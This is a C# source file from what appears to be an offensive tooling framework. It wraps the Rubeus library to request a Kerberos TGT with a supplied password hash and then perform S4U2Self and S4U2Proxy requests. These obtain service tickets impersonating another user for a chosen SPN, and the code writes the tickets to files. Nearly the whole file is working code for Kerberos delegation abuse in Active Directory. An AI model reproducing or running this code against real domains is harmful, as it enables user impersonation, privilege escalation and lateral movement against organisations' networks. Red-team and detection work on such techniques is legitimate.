using System;
using System.IO;
using Rubeus;

namespace Framework.lib2
{
    internal class TicketRequeter
    {
        private string domain;
        private string user;
        private string password;
        private string passwordHash;
        private string dc;
        private byte[] TGT;

        public TicketRequeter(string domain, string user, string password, string dc)
        {
            this.domain = domain;
            this.user = user;
            this.password = password;
            this.passwordHash = Crypto.KerberosPasswordHash(Interop.KERB_ETYPE.rc4_hmac, this.password);
            this.dc = dc;
        }

        public bool getTGT(bool verbose)
        {
            Console.WriteLine("Getting TGT for user " + this.user + " ...");
            Rubeus.lib.Interop.LUID luid = new Rubeus.lib.Interop.LUID();
            this.TGT = Ask.TGT(this.user, this.domain, this.passwordHash, Interop.KERB_ETYPE.rc4_hmac, "", false, this.dc, luid, false, false, "", false, true);

            if (TGT.Length > 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public bool getTGSS4U2Self(bool verbose, string impersonate, string spn, string output)
        {
            var spn2 = spn.Split('/')[0];
            if (File.Exists(output + "_" + impersonate + "_to_" + spn2 + "@" + this.domain.ToUpper()))
            {
                Console.WriteLine("File {0}_{1}_to_{2}@{3} already exists. Can't write TGS.", output, impersonate, spn2, this.domain.ToUpper());
                System.Environment.Exit(0);
            }
            Console.WriteLine("Getting TGS for service {0} impersonating user {1}...", spn, impersonate);
            KRB_CRED ticket = new KRB_CRED(this.TGT);
            try
            {
                if (!verbose) { Console.SetOut(new System.IO.StreamWriter(System.IO.Stream.Null)); }
                S4U.Execute(ticket, impersonate, spn, output, true, this.dc, null, null,
                    "", "", true, false, false, this.passwordHash, Interop.KERB_ETYPE.rc4_hmac, this.domain, "");
                if (!verbose)
                {
                    var standardOutput = new StreamWriter(Console.OpenStandardOutput()) { AutoFlush = true };
                    Console.SetOut(standardOutput);
                }
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
            
        }

        public bool getTGSS4U2SelfNoProxy(bool verbose, string impersonate, string spn, string output)
        {
            var spn2 = spn.Split('/')[0];
            if (File.Exists(output + "_" + impersonate + "_to_" + spn2 + "@" + this.domain.ToUpper()))
            {
                Console.WriteLine("File {0}_{1}_to_{2}@{3} already exists. Can't write TGS.", output, impersonate, spn2, this.domain.ToUpper());
                System.Environment.Exit(0);
            }
            Console.WriteLine("Getting TGS for service {0} impersonating user {1}...", spn, impersonate);
            KRB_CRED ticket = new KRB_CRED(this.TGT);
            try
            {
                if (!verbose) { Console.SetOut(new System.IO.StreamWriter(System.IO.Stream.Null)); }
                S4U.Execute(ticket, impersonate, "", output, true, this.dc, spn, null,
                    "", "", true, false, false, this.passwordHash, Interop.KERB_ETYPE.rc4_hmac, this.domain, "");
                if (!verbose)
                {
                    var standardOutput = new StreamWriter(Console.OpenStandardOutput()) { AutoFlush = true };
                    Console.SetOut(standardOutput);
                }
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }

        }
    }
}
